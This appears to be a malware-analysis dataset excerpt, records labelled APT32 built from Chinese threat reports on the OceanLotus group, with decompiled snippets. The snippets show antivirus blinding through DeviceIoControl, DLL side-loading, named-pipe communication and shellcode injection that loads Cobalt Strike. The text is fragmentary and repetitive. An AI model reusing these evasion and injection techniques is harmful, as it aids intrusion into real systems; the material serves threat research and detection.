= \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "v12[v10++]=pe.th32ProcessID;v11[v1++]=pe.th32ProcessID;while(Process32NextW(v9,&pe));CloseHandle(v9);while(sub_6BAC16C0(v11[v6]))", "hash_code": "e783924d2e82a9c14069e1923dcb6aab2859d9453f29850611251258fed232ea", "hash": "hash"}
{"file_name": "7e3b21a4-342c-4fb1-8934-77a243a0aa16_APT32.md", "title": "确定", "malicious_code": "v27 = !sub_10015620(v4) || !sub_10010E50();", "describe": "白文件加载7z.dll后，获取其导出表GetNumberOfMethods进行调用  \n\n.txt:0041C802 push offset aGetnumberofmet ; \"GetNumberOfMethods\" .text:0041C807 push dword ptr [esi];hModule .text:0041C809 mov [esp+50h+var_8],1 .text:0041C811 call ds:GetProcAddress .text:0041C817 test eax, eax .text:0041C819 jz short loc_41C82A .text:0041C81B lea ecx, [esp+48h+var_8] .text:0041C81F push ecx .text:0041C820 call eax  \n\n首先解密出字符串\"cloudflare.warp.process\"，并以此为名创建互斥体\n\n<--- Page Split --->\n\n45 v4 = sub_10001F00(v3); // cloudflare.warp.process\n46 v27 = !sub_10015620(v4) || !sub_10010E50(); // 创建互斥体\n47 *&v5 = sub_100710A0(v27, HIDWORD(v27)).m128_u64[0];\n48 v6 = sub_100013A0(v5); \n\n接着获取一组API函数地址用于获取命令行参数并进行验证 \n\n463 v375 = getFunAdd(v2, v280); // GetCommandLineW \n\n464 v404 = 0; \n\n465 v403 = 0; \n\n466 v3 = sub_10013260(v337); \n\n467 v281 = sub_10019AD0(v3); \n\n468 v4 = sub_10013180(v307); \n\n469 v5 = sub_10019AF0(v4); \n\n470 v356 = getFunAdd(v5, v281); // CommandLineToArgW \n\n471 v402 = 0; \n\n472 v447 = 0; \n\n473 v6 = sub_10013410(v336); \n\n474 v282 = sub_10019A90(v6); \n\n475 v7 = sub_10013330(v305); \n\n476 v8 = sub_10019AB0(v7); \n\n477 v393 = getFunAdd(v8, v282); // lstrcmpW \n\n541 v40 = sub_10013AB0(v333); \n\n542 v451 = sub_100199B0(v40); \n\n543 v399 = v356(v374, &v451); // 调用CommandLineToArgW, 提取参数 \n\n544 v41 = byte_100E1AC6; \n\n545 v42 = sub_10001380() + v41; \n\n589 v64 = sub_10013B80(v296); \n\n590 v65 = sub_10019990(v64); \n\n591 v346 = v393(v399[2], v65) == 0; // 调用strcmpW, 验证参数 \n\n592 v66 = sub_100710A0(v346, HIDWORD(v346)).m128_u64[0]; \n\n593 v67 = sub_10004020(v66); \n\n594 v68 = byte_100E1AC6; \n\n随后创建命名管道ntsvcs用于进程间通信 \n\n137 v23 = sub_100088A0(v63); \n\n138 v24 = sub_1001A410(v23, a1); // \\\\\\\\.\\pipe\\%s \n\n139 v74(v97, v24); // wsprintfW并接得到\\\\\\.\\pipe\\ntsvcs \n\n140 v90 = 0; \n\n141 v89 = 0; \n\n142 v25 = sub_100084A0(v67); \n\n143 v57 = sub_1001A3D0(v25, 0, 0); \n\n144 v26 = sub_10008970(v66); \n\n145 v27 = sub_1001A3F0(v26, 0, 0, v57); \n\n146 v83 = v79(v97, v27, v55, v56, v58, v59, v62); // CreateFileW创建命名管道ntsvcs \n\n147 v28 = byte_100E1AC6; \n\n使用ReadFile、WriteFile从/向管道读取/写入数据 \n\n266 v5 = sub_1001A590(v4); // kernel32.dll \n\n267 v238 = getFunAdd(v5, v174); // WriteFile \n\n268 v250 = 0; \n\n269 v249 = 0; \n\n270 v6 = sub_100078A0(v181); \n\n271 v175 = sub_1001A530(v6); \n\n272 v7 = sub_100077C0(v177); \n\n273 v8 = sub_1001A550(v7); \n\n274 v212 = getFunAdd(v8, v175); // ReadFile \n\n275 v9 = byte_100E1AC6;\n\n<--- Page Split --->\n\n获取Chakra.JsProjectWinRTNamespace函数的存，并通过VirtualProtect更改其属性为读写权限  \n\n![](images/6_0.jpg)\n  \n\n随后将Shellcode写入该内存，再次通过VirtualProtect更改其属性为可执行  \n\n![](images/6_1.jpg)\n  \n\n最终内存中加载的有效负载仍为Cobalt Strike Beacon\n\n<--- Page Split --->\n\n\n<table><tr><td>69948201</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948202</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948203</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948204</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948205</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948206</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948207</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948208</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948209</td><td>40</td><td>dec ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820A</td><td>5A</td><td>pop edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820B</td><td>52</td><td>push edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820C</td><td>45</td><td>inc ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820D</td><td>E8 00000000</td><td>call chakra.69948212</td><td></td><td></td><td></td><td></td><td>call s0</td></tr><tr><td>69948212</td><td>5B</td><td>pop ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948213</td><td>89DF</td><td>mov edi,ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948215</td><td>55</td><td>push ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948216</td><td>89E5</td><td>mov ebp,esp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948218</td><td>81C3 87C00000</td><td>add ebx,9CB7</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994821E</td><td>FFD3</td><td>call ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948220</td><td>68 F0B5A256</td><td>push 56A2B5F0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948225</td><td>68 04000000</td><td>push 4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822A</td><td>57</td><td>push edi</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822B</td><td>FFD0</td><td>call eax</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822D</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822F</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948231</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948233</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948235</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>\n\n4", "format_code": "v27=!sub_10015620(v4)||!sub_10010E50();", "hash_code": "7d091eb91e98ce5d629c466c0c4727a2430ae2635217cf5e9d72abbc31588299", "hash": "hash"}
{"file_name": "7e3b21a4-342c-4fb1-8934-77a243a0aa16_APT32.md", "title": "确定", "malicious_code": "v399 = v356(v374, &v451);\nv346 = v393(v399[2], v65) == 0;", "describe": "白文件加载7z.dll后，获取其导出表GetNumberOfMethods进行调用  \n\n.txt:0041C802 push offset aGetnumberofmet ; \"GetNumberOfMethods\" .text:0041C807 push dword ptr [esi];hModule .text:0041C809 mov [esp+50h+var_8],1 .text:0041C811 call ds:GetProcAddress .text:0041C817 test eax, eax .text:0041C819 jz short loc_41C82A .text:0041C81B lea ecx, [esp+48h+var_8] .text:0041C81F push ecx .text:0041C820 call eax  \n\n首先解密出字符串\"cloudflare.warp.process\"，并以此为名创建互斥体\n\n<--- Page Split --->\n\n45 v4 = sub_10001F00(v3); // cloudflare.warp.process\n46 v27 = !sub_10015620(v4) || !sub_10010E50(); // 创建互斥体\n47 *&v5 = sub_100710A0(v27, HIDWORD(v27)).m128_u64[0];\n48 v6 = sub_100013A0(v5); \n\n接着获取一组API函数地址用于获取命令行参数并进行验证 \n\n463 v375 = getFunAdd(v2, v280); // GetCommandLineW \n\n464 v404 = 0; \n\n465 v403 = 0; \n\n466 v3 = sub_10013260(v337); \n\n467 v281 = sub_10019AD0(v3); \n\n468 v4 = sub_10013180(v307); \n\n469 v5 = sub_10019AF0(v4); \n\n470 v356 = getFunAdd(v5, v281); // CommandLineToArgW \n\n471 v402 = 0; \n\n472 v447 = 0; \n\n473 v6 = sub_10013410(v336); \n\n474 v282 = sub_10019A90(v6); \n\n475 v7 = sub_10013330(v305); \n\n476 v8 = sub_10019AB0(v7); \n\n477 v393 = getFunAdd(v8, v282); // lstrcmpW \n\n541 v40 = sub_10013AB0(v333); \n\n542 v451 = sub_100199B0(v40); \n\n543 v399 = v356(v374, &v451); // 调用CommandLineToArgW, 提取参数 \n\n544 v41 = byte_100E1AC6; \n\n545 v42 = sub_10001380() + v41; \n\n589 v64 = sub_10013B80(v296); \n\n590 v65 = sub_10019990(v64); \n\n591 v346 = v393(v399[2], v65) == 0; // 调用strcmpW, 验证参数 \n\n592 v66 = sub_100710A0(v346, HIDWORD(v346)).m128_u64[0]; \n\n593 v67 = sub_10004020(v66); \n\n594 v68 = byte_100E1AC6; \n\n随后创建命名管道ntsvcs用于进程间通信 \n\n137 v23 = sub_100088A0(v63); \n\n138 v24 = sub_1001A410(v23, a1); // \\\\\\\\.\\pipe\\%s \n\n139 v74(v97, v24); // wsprintfW并接得到\\\\\\.\\pipe\\ntsvcs \n\n140 v90 = 0; \n\n141 v89 = 0; \n\n142 v25 = sub_100084A0(v67); \n\n143 v57 = sub_1001A3D0(v25, 0, 0); \n\n144 v26 = sub_10008970(v66); \n\n145 v27 = sub_1001A3F0(v26, 0, 0, v57); \n\n146 v83 = v79(v97, v27, v55, v56, v58, v59, v62); // CreateFileW创建命名管道ntsvcs \n\n147 v28 = byte_100E1AC6; \n\n使用ReadFile、WriteFile从/向管道读取/写入数据 \n\n266 v5 = sub_1001A590(v4); // kernel32.dll \n\n267 v238 = getFunAdd(v5, v174); // WriteFile \n\n268 v250 = 0; \n\n269 v249 = 0; \n\n270 v6 = sub_100078A0(v181); \n\n271 v175 = sub_1001A530(v6); \n\n272 v7 = sub_100077C0(v177); \n\n273 v8 = sub_1001A550(v7); \n\n274 v212 = getFunAdd(v8, v175); // ReadFile \n\n275 v9 = byte_100E1AC6;\n\n<--- Page Split --->\n\n获取Chakra.JsProjectWinRTNamespace函数的存，并通过VirtualProtect更改其属性为读写权限  \n\n![](images/6_0.jpg)\n  \n\n随后将Shellcode写入该内存，再次通过VirtualProtect更改其属性为可执行  \n\n![](images/6_1.jpg)\n  \n\n最终内存中加载的有效负载仍为Cobalt Strike Beacon\n\n<--- Page Split --->\n\n\n<table><tr><td>69948201</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948202</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948203</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948204</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948205</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948206</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948207</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948208</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948209</td><td>40</td><td>dec ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820A</td><td>5A</td><td>pop edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820B</td><td>52</td><td>push edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820C</td><td>45</td><td>inc ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820D</td><td>E8 00000000</td><td>call chakra.69948212</td><td></td><td></td><td></td><td></td><td>call s0</td></tr><tr><td>69948212</td><td>5B</td><td>pop ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948213</td><td>89DF</td><td>mov edi,ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948215</td><td>55</td><td>push ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948216</td><td>89E5</td><td>mov ebp,esp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948218</td><td>81C3 87C00000</td><td>add ebx,9CB7</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994821E</td><td>FFD3</td><td>call ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948220</td><td>68 F0B5A256</td><td>push 56A2B5F0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948225</td><td>68 04000000</td><td>push 4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822A</td><td>57</td><td>push edi</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822B</td><td>FFD0</td><td>call eax</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822D</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822F</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948231</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948233</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948235</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>\n\n4", "format_code": "v399=v356(v374,&v451);v346=v393(v399[2],v65)==0;", "hash_code": "59a03033dd4955d827a620d85a9ae973883584857909a872887254c7df0f8667", "hash": "hash"}
{"file_name": "7e3b21a4-342c-4fb1-8934-77a243a0aa16_APT32.md", "title": "确定", "malicious_code": "v83 = v79(v97, v27, v55, v56, v58, v59, v62);", "describe": "白文件加载7z.dll后，获取其导出表GetNumberOfMethods进行调用  \n\n.txt:0041C802 push offset aGetnumberofmet ; \"GetNumberOfMethods\" .text:0041C807 push dword ptr [esi];hModule .text:0041C809 mov [esp+50h+var_8],1 .text:0041C811 call ds:GetProcAddress .text:0041C817 test eax, eax .text:0041C819 jz short loc_41C82A .text:0041C81B lea ecx, [esp+48h+var_8] .text:0041C81F push ecx .text:0041C820 call eax  \n\n首先解密出字符串\"cloudflare.warp.process\"，并以此为名创建互斥体\n\n<--- Page Split --->\n\n45 v4 = sub_10001F00(v3); // cloudflare.warp.process\n46 v27 = !sub_10015620(v4) || !sub_10010E50(); // 创建互斥体\n47 *&v5 = sub_100710A0(v27, HIDWORD(v27)).m128_u64[0];\n48 v6 = sub_100013A0(v5); \n\n接着获取一组API函数地址用于获取命令行参数并进行验证 \n\n463 v375 = getFunAdd(v2, v280); // GetCommandLineW \n\n464 v404 = 0; \n\n465 v403 = 0; \n\n466 v3 = sub_10013260(v337); \n\n467 v281 = sub_10019AD0(v3); \n\n468 v4 = sub_10013180(v307); \n\n469 v5 = sub_10019AF0(v4); \n\n470 v356 = getFunAdd(v5, v281); // CommandLineToArgW \n\n471 v402 = 0; \n\n472 v447 = 0; \n\n473 v6 = sub_10013410(v336); \n\n474 v282 = sub_10019A90(v6); \n\n475 v7 = sub_10013330(v305); \n\n476 v8 = sub_10019AB0(v7); \n\n477 v393 = getFunAdd(v8, v282); // lstrcmpW \n\n541 v40 = sub_10013AB0(v333); \n\n542 v451 = sub_100199B0(v40); \n\n543 v399 = v356(v374, &v451); // 调用CommandLineToArgW, 提取参数 \n\n544 v41 = byte_100E1AC6; \n\n545 v42 = sub_10001380() + v41; \n\n589 v64 = sub_10013B80(v296); \n\n590 v65 = sub_10019990(v64); \n\n591 v346 = v393(v399[2], v65) == 0; // 调用strcmpW, 验证参数 \n\n592 v66 = sub_100710A0(v346, HIDWORD(v346)).m128_u64[0]; \n\n593 v67 = sub_10004020(v66); \n\n594 v68 = byte_100E1AC6; \n\n随后创建命名管道ntsvcs用于进程间通信 \n\n137 v23 = sub_100088A0(v63); \n\n138 v24 = sub_1001A410(v23, a1); // \\\\\\\\.\\pipe\\%s \n\n139 v74(v97, v24); // wsprintfW并接得到\\\\\\.\\pipe\\ntsvcs \n\n140 v90 = 0; \n\n141 v89 = 0; \n\n142 v25 = sub_100084A0(v67); \n\n143 v57 = sub_1001A3D0(v25, 0, 0); \n\n144 v26 = sub_10008970(v66); \n\n145 v27 = sub_1001A3F0(v26, 0, 0, v57); \n\n146 v83 = v79(v97, v27, v55, v56, v58, v59, v62); // CreateFileW创建命名管道ntsvcs \n\n147 v28 = byte_100E1AC6; \n\n使用ReadFile、WriteFile从/向管道读取/写入数据 \n\n266 v5 = sub_1001A590(v4); // kernel32.dll \n\n267 v238 = getFunAdd(v5, v174); // WriteFile \n\n268 v250 = 0; \n\n269 v249 = 0; \n\n270 v6 = sub_100078A0(v181); \n\n271 v175 = sub_1001A530(v6); \n\n272 v7 = sub_100077C0(v177); \n\n273 v8 = sub_1001A550(v7); \n\n274 v212 = getFunAdd(v8, v175); // ReadFile \n\n275 v9 = byte_100E1AC6;\n\n<--- Page Split --->\n\n获取Chakra.JsProjectWinRTNamespace函数的存，并通过VirtualProtect更改其属性为读写权限  \n\n![](images/6_0.jpg)\n  \n\n随后将Shellcode写入该内存，再次通过VirtualProtect更改其属性为可执行  \n\n![](images/6_1.jpg)\n  \n\n最终内存中加载的有效负载仍为Cobalt Strike Beacon\n\n<--- Page Split --->\n\n\n<table><tr><td>69948201</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948202</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948203</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948204</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948205</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948206</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948207</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948208</td><td>90</td><td>nop</td><td></td><td></td><td></td><td></td><td></td></tr></table><br><br><table><tr><td>69948209</td><td>40</td><td>dec ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820A</td><td>5A</td><td>pop edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820B</td><td>52</td><td>push edx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820C</td><td>45</td><td>inc ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994820D</td><td>E8 00000000</td><td>call chakra.69948212</td><td></td><td></td><td></td><td></td><td>call s0</td></tr><tr><td>69948212</td><td>5B</td><td>pop ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948213</td><td>89DF</td><td>mov edi,ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948215</td><td>55</td><td>push ebp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948216</td><td>89E5</td><td>mov ebp,esp</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948218</td><td>81C3 87C00000</td><td>add ebx,9CB7</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994821E</td><td>FFD3</td><td>call ebx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948220</td><td>68 F0B5A256</td><td>push 56A2B5F0</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948225</td><td>68 04000000</td><td>push 4</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822A</td><td>57</td><td>push edi</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822B</td><td>FFD0</td><td>call eax</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822D</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>6994822F</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948231</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948233</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>69948235</td><td>0000</td><td>add byte ptr ds:[eax],al</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>\n\n4", "format_code": "v83=v79(v97,v27,v55,v56,v58,v59,v62);", "hash_code": "4cad5af253b13df6b2b5b86f5042c8ed5c56d403976ec6f2843b72c6558bf38c", "hash": "hash"}
{"file_name": "7e3b21a4-342c-4fb1-8934-77a243a0aa16_APT32.md", "title": "确定", "malicious_code": "v238 = getFunAdd(v5, v174);\nv212 = getFunAdd(v8, v175);", "describe": "白文件加载7z.dll后，获取其导出表GetNumberOfMethods进行调用  \n\n.txt:0041C802 push offset aGetnumberofmet ; \"GetNumberOfMethods\" .text:0041C807 push dword ptr [esi];hModule .text:0041C809 mov [esp+50h+var_8],1 .text:0041C811 call ds:GetProcAddress .text:0041C817 test eax, eax .text:0041C819 jz short loc_41C82A .text:0041C81B lea ecx, [esp+48h+var_8] .text:0041C81F push ecx .text:0041C820 call eax  \n\n首先解密出字符串\"cloudflare.warp.process\"，并以此为名创建互斥体\n\n<--- Page Split --->\n\n45 v4 = sub_10001F00(v3); // cloudflare.warp.process\n46 v27 = !sub_10015620(v4) || !sub_10010E50(); // 创建互斥体\n47 *&v5 = sub_100710A0(v27, HIDWORD(v27)).m128_u64[0];\n48 v6 = sub_100013A0(v5); \n\n接着获取一组API函数地址用于获取命令行参数并进行验证 \n\n463 v375 = getFunAdd(v2, v280); // GetCommandLineW \n\n464 v404 = 0; \n\n465 v403 = 0; \n\n466 v3 = sub_10013260(v337); \n\n467 v281 = sub_10019AD0(v3); \n\n468 v4 = sub_10013180(v307); \n\n469 v5 = sub_10019AF0(v4); \n\n470 v356 = getFunAdd(v5, v281); // CommandLineToArgW \n\n471 v402 = 0; \n\n472 v447 = 0; \n\n473 v6 = sub_10013410(v336); \n\n474 v282 = sub_10019A90(v6); \n\n475 v7 = sub_10013330(v305); \n\n476 v8 = sub_10019AB0(v7); \n\n477 v393 = getFunAdd(v8, v282); // lstrcmpW \n\n541 v40 = sub_10013AB0(v333); \n\n542 v451 = sub_100199B0(v40); \n\n543 v399 = v356(v374, &v451); // 调用CommandLineToArgW, 提取参数 \n\n544 v41 = byte_100E1AC6; \n\n545 v42 = sub_10001380() + v41; \n\n589 v64 = sub_10013B80(v296); \n\n590 v65 = sub_10019990(v64); \n\n591 v346 = v393(v399[2], v65) == 0; // 调用strcmpW, 验证参数 \n\n592 v66 = sub_100710A0(v346, HIDWORD(v346)).m128_u64[0]; \n\n593 v67 = sub_10004020(v66); \n\n594 v68 = byte_100E1AC6; \n\n随后创建命名管道ntsvcs用于进程间通信 \n\n137 v23 = sub_100088A0(v63); \n\n138 v24 = sub_1001A410(v23, a1); // \\\\\\\\.\\pipe\\%s \n\n139 v74(v97, v24); // wsprintfW并接得到\\\\\\.\\pipe\\ntsvcs \n\n140 v90 = 0; \n\n141 v89 = 0; \n\n142 v25 = sub_100084A0(v67); \n\n143 v57 = sub_1001A3D0(v25, 0, 0); \n\n144 v26 = sub_10008970(v66); \n\n145 v27 = sub_1001A3F0(v26, 0, 0, v57); \n\n146 v83 = v79(v97, v27, v55, v56, v58, v59, v62); // CreateFileW创建命名管道ntsvcs \n\n147 v28 = byte_100E1AC6; \n\n使用ReadFile、WriteFile从/向管道读取/写入数据 \n\n266 v5 = 